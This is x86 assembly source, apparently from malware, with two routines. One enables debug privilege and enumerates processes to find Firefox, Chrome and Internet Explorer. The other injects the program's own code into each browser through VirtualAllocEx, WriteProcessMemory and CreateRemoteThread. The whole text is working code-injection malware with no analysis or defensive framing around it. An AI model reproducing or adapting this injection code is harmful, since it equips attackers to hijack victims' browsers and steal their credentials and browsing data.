
.code

;; ==================================================================================================== ;;
;; EnumProcs - procedure enum all processes handles and pass them into InjAndRun procedure              ;;
;; Return:  0 - failed                                                                                  ;;
;;         !0 - success                                                                                 ;;
;; ==================================================================================================== ;;
EnumProcs proc
	local  idProcess  : dword
	local  hSnapshot  : dword
	local  dwPrevPriv : dword
	local  p_entry    : PROCESSENTRY32



	;; Get debug drivilege
	invokx  _RtlAdjustPrivilege[ebx],\
			20,\			;; SE_DEBUG_PRIVILEGE
			1,\				;; Enable
			0,\				;; ADJUST_CURRENT_PROCESS
			&dwPrevPriv		;; Enabled


	;; Get current id to prevent self inject
	invokx  _GetCurrentProcessId[ebx]
	mov  idProcess, eax


	;; Take snapshot of the processes
	invokx  _CreateToolhelp32Snapshot[ebx], TH32CS_SNAPPROCESS, 0
	mov  hSnapshot, eax
	inc  eax
	jmpz eax, @ret


	;; Get first process in snapshot
	mov  p_entry.dwSize, sizeof PROCESSENTRY32
	invokx  _Process32First[ebx], hSnapshot, &p_entry
	jmpz eax, @ret
	jmp  @inject


@next:
	;; Get next process in snapshot
	mov  p_entry.dwSize, sizeof PROCESSENTRY32
	invokx  _Process32Next[ebx], hSnapshot, &p_entry
	jmpz eax, @nomore


@inject:
	;; Prevent self inject
	mov  eax, idProcess
	cmp  eax, p_entry.th32ProcessID
	jz   @next


;; ================================================== ;;
	invokx  _lstrcmpiA[ebx], &p_entry.szExeFile, "firefox.exe"
	jmpz eax, @F
	invokx  _lstrcmpiA[ebx], &p_entry.szExeFile, "chrome.exe"
	jmpz eax, @F
	invokx  _lstrcmpiA[ebx], &p_entry.szExeFile, "iexplore.exe"
	jmpnz eax, @next
@@:
;; ================================================== ;;

	;; Get process handle
	invokx  _OpenProcess[ebx], PROCESS_ALL_ACCESS, 0, p_entry.th32ProcessID
	jmpz eax, @next


	;; Pass handle into InjAndRun procedure
	invokx  &InjectCode[ebx], eax
	jmp  @next


@nomore:
	;; Dedstroy handle
	invokx  _CloseHandle[ebx], hSnapshot


@ret:
	ret
EnumProcs endp



;; ==================================================================================================== ;;
;; InjectCode - procedure injects current code in remote process and starts it                          ;;
;; __in hProcess - process handle                                                                       ;;
;; Return:  0 - failed                                                                                  ;;
;;         !0 - success                                                                                 ;;
;; ==================================================================================================== ;;
InjectCode proc hProcess : dword
	local  lpRemoteCode : dword



	;; Alocate memory in remote process
	invokx  _VirtualAllocEx[ebx], hProcess, 0, @CODE_END-@CODE_START, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE
	jmpz eax, @ret
	mov  lpRemoteCode, eax


	;; Copy code in remote process
	lea  eax, [ebx+@CODE_START]	;; lpBuffer
	invokx  _WriteProcessMemory[ebx], hProcess, lpRemoteCode, eax, @CODE_END-@CODE_START, 0
	jmpnz eax, @F


	;; Release memory in remote process
	invokx  _VirtualFreeEx[ebx], hProcess, lpRemoteCode, 0, MEM_RELEASE
	xor  eax, eax
	jmp  @ret


	;; Start remote code
@@:	add  lpRemoteCode, INJECTED_START-@CODE_START
	invokx  _CreateRemoteThread[ebx], hProcess, 0, 0, lpRemoteCode, 0, 0, 0


@ret:
	ret
InjectCode endp

